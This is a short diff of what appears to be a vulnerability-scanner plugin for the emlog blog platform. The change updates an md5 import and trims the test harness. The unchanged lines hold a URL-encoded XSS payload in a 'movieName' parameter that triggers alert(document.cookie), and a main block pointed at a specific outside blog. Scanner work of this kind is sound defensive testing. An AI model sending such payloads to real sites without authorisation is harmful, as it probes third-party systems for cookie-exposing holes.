@@ -5,7 +5,7 @@
 #_PlugName_ = emlog XSS Plugin
 #_FileName_ = emlog.py
 
-import md5
+from hashlib import md5
 
 def assign(service, arg):
 	if service == 'emlog':
@@ -21,5 +21,5 @@ def audit(arg):
             security_info(url + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}//')
 		
 if __name__ == '__main__':
-  from dummy import *
+
   audit(assign('emlog', 'http://blog.qiyuuu.com/')[1])
